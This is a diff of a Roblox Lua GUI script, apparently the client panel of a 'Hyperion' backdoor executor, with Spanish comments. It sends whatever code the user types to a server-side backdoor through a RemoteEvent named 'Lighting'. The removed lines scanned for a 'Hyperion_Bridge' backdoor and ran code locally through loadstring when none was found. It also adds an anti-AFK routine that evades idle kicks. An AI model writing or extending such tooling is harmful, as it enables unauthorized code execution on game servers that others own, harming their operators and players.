@@ -543,67 +543,135 @@ UICorner_18.Parent = TextButton
 UICorner_19.Parent = BackgroundColor
 
 
--------------------------------------------------------------------------
--- [ HYPERION V1 - FINAL FIX ] --
--------------------------------------------------------------------------
+-- // CONFIGURACIÓN DE CONEXIÓN //
+local REMOTE_NAME = "Lighting" -- Debe coincidir con el de la backdoor
+local remote = game:GetService("ReplicatedStorage"):WaitForChild(REMOTE_NAME)
 
-local StarterGui = game:GetService("StarterGui")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
+-- // VARIABLES PRINCIPALES //
+local player = game.Players.LocalPlayer
+local mouse = player:GetMouse()
 
--- Función de Notificación
-local function Notify(txt)
-    StarterGui:SetCore("SendNotification", {
-        Title = "Hyperion",
-        Text = txt,
-        Icon = "rbxassetid://95681654391325",
-        Duration = 4
-    })
+-- // FUNCIÓN DE NAVEGACIÓN (TABS) //
+local function showPanel(panelName)
+	ScanPanel.Enabled = (panelName == "Scan")
+	ExecutorPanel.Enabled = (panelName == "Executor")
+	SettingsPanel.Enabled = (panelName == "Settings")
 end
 
--- LÓGICA DEL BOTÓN SCAN
+-- Configuración inicial
+showPanel("Scan")
+
+ScanPanelButton.MouseButton1Click:Connect(function() showPanel("Scan") end)
+ExecutorPanelButton.MouseButton1Click:Connect(function() showPanel("Executor") end)
+SettingsPanelButton.MouseButton1Click:Connect(function() showPanel("Settings") end)
+
+-- // LÓGICA DEL PANEL DE SCAN //
 ScanButton.MouseButton1Click:Connect(function()
-    ScanButton.Text = "Checking..."
-    task.wait(0.5)
-    
-    -- Buscamos el puente en ReplicatedStorage
-    local bridge = ReplicatedStorage:FindFirstChild("Hyperion_Bridge")
-    
-    if bridge then
-        ScanButton.TextColor3 = Color3.fromRGB(0, 255, 127)
-        ScanButton.Text = "Backdoor found!"
-        Notify("Backdoor found!")
-    else
-        ScanButton.TextColor3 = Color3.fromRGB(255, 80, 80)
-        ScanButton.Text = "No backdoor."
-        Notify("No backdoor found in this server.")
-        task.wait(2)
-        ScanButton.TextColor3 = Color3.fromRGB(0, 0, 0)
-        ScanButton.Text = "SCAN"
-    end
+	WelcomeText.Text = "Welcome back, " .. player.Name .. "."
+	UserId.Text = "User ID: " .. player.UserId
+	
+	-- Obtener miniatura del jugador
+	local content, isReady = game.Players:GetUserThumbnailAsync(player.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size100x100)
+	UserAvatar.Image = content
+	
+	-- Efecto visual simple
+	ScanButton.Text = "SYSTEM READY"
+	task.wait(1)
+	ScanButton.Text = "Scan"
 end)
 
--- LÓGICA DEL BOTÓN EXECUTE (Híbrido)
+-- // LÓGICA DEL EXECUTOR //
 ExecuteButton.MouseButton1Click:Connect(function()
-    local code = Script.Text
-    local bridge = ReplicatedStorage:FindFirstChild("Hyperion_Bridge")
-    
-    if bridge then
-        -- Si hay backdoor, lo manda al SERVIDOR
-        bridge:FireServer(code)
-        Notify("Executed on Server!")
-    else
-        -- Si no hay, lo intenta ejecutar LOCAL
-        local func, err = loadstring(code)
-        if func then 
-            pcall(func)
-            Notify("Executed Locally")
-        else 
-            warn("Hyperion Error: "..err) 
-        end
-    end
+	local code = Script.Text
+	if code ~= "" then
+		remote:FireServer(code) -- Envía el código a la backdoor
+		ExecuteButton.Text = "Executed!"
+		task.wait(0.5)
+		ExecuteButton.Text = "Execute"
+	end
 end)
 
--- RESET DE PANELES (Para que se oculte todo bien)
+ClearButton.MouseButton1Click:Connect(function()
+	Script.Text = ""
+end)
+
+-- // LÓGICA DE SETTINGS //
+
+-- Toggle para Anti-AFK
+local antiAfkEnabled = false
+AntiAFK.MouseButton1Click:Connect(function()
+	antiAfkEnabled = not antiAfkEnabled
+	Frame.BackgroundColor3 = antiAfkEnabled and Color3.fromRGB(0, 255, 100) or Color3.fromRGB(255, 255, 255)
+	
+	if antiAfkEnabled then
+		-- Script simple de Anti-AFK
+		local virtualUser = game:GetService("VirtualUser")
+		player.Idled:Connect(function()
+			if antiAfkEnabled then
+				virtualUser:CaptureController()
+				virtualUser:ClickButton2(Vector2.new())
+			end
+		end)
+	end
+end)
+
+-- Abrir selector de color
+BackgroundColorButton.MouseButton1Click:Connect(function()
+	BackgroundColorGui.Enabled = not BackgroundColorGui.Enabled
+end)
+
+-- Aplicar color Hexadecimal
+TextButton.MouseButton1Click:Connect(function()
+	local hex = TextBox.Text
+	local success, result = pcall(function()
+		return Color3.fromHex(hex)
+	end)
+	
+	if success then
+		Background.BackgroundColor3 = result
+		Frame_4.BackgroundColor3 = result
+		BackgroundColorGui.Enabled = false
+	else
+		TextBox.Text = "Invalid Hex!"
+		task.wait(1)
+		TextBox.Text = ""
+	end
+end)
+
+-- // BOTÓN DE MINIMIZAR (TOGGLE) //
 ToggleButton.MouseButton1Click:Connect(function()
-    Hyperion.Enabled = not Hyperion.Enabled
+	Background.Visible = not Background.Visible
+end)
+
+-- // HACER LA GUI ARRASTRABLE //
+local dragging, dragInput, dragStart, startPos
+
+local function update(input)
+	local delta = input.Position - dragStart
+	Background.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+end
+
+Background.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 then
+		dragging = true
+		dragStart = input.Position
+		startPos = Background.Position
+		input.Changed:Connect(function()
+			if input.UserInputState == Enum.UserInputState.End then
+				dragging = false
+			end
+		end)
+	end
+end)
+
+Background.InputChanged:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseMovement then
+		dragInput = input
+	end
+end)
+
+game:GetService("UserInputService").InputChanged:Connect(function(input)
+	if input == dragInput and dragging then
+		update(input)
+	end
 end)
